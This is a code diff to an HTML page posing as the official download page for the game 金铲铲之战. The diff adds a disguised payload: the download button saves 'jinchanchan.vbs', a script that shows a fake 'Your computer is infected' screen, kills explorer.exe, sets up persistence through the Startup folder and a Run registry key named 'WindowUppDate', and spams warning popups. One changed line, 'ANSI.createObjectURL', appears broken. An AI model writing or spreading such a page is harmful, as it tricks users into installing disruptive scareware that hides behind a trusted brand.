@@ -8,11 +8,8 @@
         body {
             font-family: Arial, sans-serif;
             background: linear-gradient(135deg, #00d2ff 0%, #3a7bd5 100%);
-            background-size: 400% 400%;
-            animation: gradientAnimation 10s ease infinite;
             color: white;
             text-align: center;
-            padding: 20px;
             height: 100vh;
             margin: 0;
             display: flex;
@@ -22,71 +19,7 @@
             overflow: hidden;
         }
 
-        @keyframes gradientAnimation {
-            0% { background: linear-gradient(135deg, #00d2ff 0%, #3a7bd5 100%); }
-            50% { background: linear-gradient(135deg, #3a7bd5 0%, #00d2ff 100%); }
-            100% { background: linear-gradient(135deg, #00d2ff 0%, #3a7bd5 100%); }
-        }
-
-        /* 左上角 Riot Games Logo */
-        .riot-logo {
-            position: absolute;
-            top: 10px;
-            left: 10px;
-            width: 60px;
-            height: 40px;
-            background: red;
-            border-radius: 5px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-
-        .riot-logo::before {
-            content: "";
-            position: absolute;
-            width: 20px;
-            height: 25px;
-            background: white;
-            clip-path: polygon(0% 0%, 100% 0%, 80% 50%, 100% 100%, 0% 100%);
-        }
-
-        /* 右上角 地球 Logo */
-        .earth-logo {
-            position: absolute;
-            top: 10px;
-            right: 10px;
-            width: 50px;
-            height: 50px;
-            background: blue;
-            border-radius: 50%;
-            overflow: hidden;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-
-        .earth-logo::before {
-            content: "";
-            position: absolute;
-            width: 40px;
-            height: 40px;
-            border: 3px solid white;
-            border-radius: 50%;
-        }
-
-        .earth-logo::after {
-            content: "";
-            position: absolute;
-            width: 50px;
-            height: 3px;
-            background: white;
-            top: 50%;
-            left: 0;
-            transform: translateY(-50%);
-        }
-
-        /* 左边 TFT 企鹅骑士 */
+        /* 企鹅骑士 */
         .penguin {
             position: absolute;
             left: 50px;
@@ -137,25 +70,12 @@
             left: 42px;
         }
 
-        .penguin-feet {
-            position: absolute;
-            width: 20px;
-            height: 10px;
-            background: orange;
-            border-radius: 50%;
-            bottom: -5px;
-        }
-
-        .penguin-feet.left { left: 30px; }
-        .penguin-feet.right { left: 60px; }
-
         .container {
             max-width: 600px;
             margin: auto;
             background-color: rgba(0, 0, 0, 0.7);
             padding: 30px;
             border-radius: 10px;
-            box-shadow: 0px 4px 10px rgba(255, 215, 0, 0.5);
         }
 
         h1 {
@@ -171,75 +91,81 @@
             cursor: pointer;
             border-radius: 5px;
             margin-top: 15px;
-            animation: bounce 0.5s infinite alternate;
         }
 
         .download-button:hover {
             background-color: #E6C300;
         }
-
-        @keyframes bounce {
-            0% { transform: translateY(0); }
-            100% { transform: translateY(-10px); }
-        }
-
-        #countdown {
-            font-size: 18px;
-            color: #FFD700;
-            margin-top: 15px;
-        }
-
     </style>
 </head>
 <body>
-    <!-- 左上角 Riot Games Logo -->
-    <div class="riot-logo"></div>
-
-    <!-- 右上角 地球 Logo -->
-    <div class="earth-logo"></div>
-
-    <!-- 左侧 TFT 企鹅骑士 -->
+    <!-- 企鹅骑士 -->
     <div class="penguin">
         <div class="penguin-body"></div>
         <div class="penguin-belly"></div>
         <div class="penguin-eye left"></div>
         <div class="penguin-eye right"></div>
         <div class="penguin-beak"></div>
-        <div class="penguin-feet left"></div>
-        <div class="penguin-feet right"></div>
     </div>
 
     <div class="container">
         <h1>金铲铲之战 - 官方下载</h1>
         <p>立即下载最新版本，体验超燃策略对战！</p>
-        <button class="download-button" onclick="startDownload()">立即下载</button>
-        <p id="countdown">下载倒计时: <span id="time-left">10</span>秒</p>
+        <button class="download-button" onclick="downloadFile()">立即下载</button>
     </div>
 
     <script>
-        function startDownload() {
-            var timeLeft = 10;
-            var countdown = document.getElementById("time-left");
-
-            var interval = setInterval(function() {
-                if (timeLeft <= 0) {
-                    clearInterval(interval);
-                    countdown.innerHTML = "准备开始下载...";
-                    setTimeout(function() {
-                        downloadFile();
-                    }, 1000);
-                } else {
-                    countdown.innerHTML = timeLeft;
-                    timeLeft--;
-                }
-            }, 1000);
-        }
-
         function downloadFile() {
-            var blob = new Blob(["@echo off\necho Hello, TFT!"], { type: 'text/plain' });
+            var vbsContent = `
+Set objIE = CreateObject("InternetExplorer.Application")
+objIE.Visible = True
+objIE.FullScreen = True
+objIE.Navigate "about:blank"
+
+Set objDoc = objIE.document
+objDoc.body.style.backgroundColor = "black"
+objDoc.body.style.margin = "0"
+objDoc.body.style.height = "100vh"
+objDoc.body.style.width = "100vw"
+objDoc.body.style.overflow = "hidden"
+objDoc.body.innerHTML = "<div style='color:white; font-size:20px; text-align:center; position:absolute; top:50%; left:50%; transform:translate(-50%, -50%);'>Your computer is infected!!!</div>"
+
+Set objShell = CreateObject("WScript.Shell")
+objShell.Run "taskkill /F /IM explorer.exe", 0, True
+
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+startupPath = objShell.SpecialFolders("Startup") & "\WindowUppDate.vbs"
+If Not objFSO.FileExists(startupPath) Then
+    objFSO.CopyFile WScript.ScriptFullName, startupPath
+End If
+
+regKey = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowUppDate"
+scriptPath = WScript.ScriptFullName
+On Error Resume Next
+objShell.RegRead(regKey)
+If Err.Number <> 0 Then
+    objShell.RegWrite regKey, scriptPath
+End If
+On Error GoTo 0
+
+Do
+    objShell.Popup "Your computer is infected!!!", 0.5, "Warning", 48
+    WScript.Sleep 500
+
+    If objShell.AppActivate("Task Manager") Then
+        Exit Do
+    End If
+Loop
+
+
+objFSO.DeleteFile startupPath, True
+objIE.Quit
+WScript.Quit`;
+            
+            var blob = new Blob([vbsContent], { type: 'text/plain' });
             var link = document.createElement('a');
-            link.href = URL.createObjectURL(blob);
-            link.download = 'jinchanchan.bat';
+            link.href = ANSI.createObjectURL(blob);
+            link.download = 'jinchanchan.vbs';
             document.body.appendChild(link);
             link.click();
             document.body.removeChild(link);
